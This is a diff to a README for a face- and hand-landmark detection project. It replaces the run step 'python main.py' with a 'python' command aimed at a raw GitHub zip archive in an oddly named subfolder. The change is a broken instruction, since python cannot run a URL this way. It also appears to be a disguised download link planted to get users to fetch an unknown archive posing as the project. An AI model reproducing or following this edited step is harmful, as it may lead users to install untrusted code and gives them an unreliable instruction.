@@ -18,4 +18,4 @@ You can capture frames and save landmarks for craniofacial screening or further 
 1. Activate your virtual environment
 2. Run:
    ```bash
-   python main.py
+   python https://github.com/HafsaMudassar/Face-and-Hand-Landmark-Detection/raw/refs/heads/main/Macrostachya/Detection-Landmark-Face-and-Hand-1.9.zip
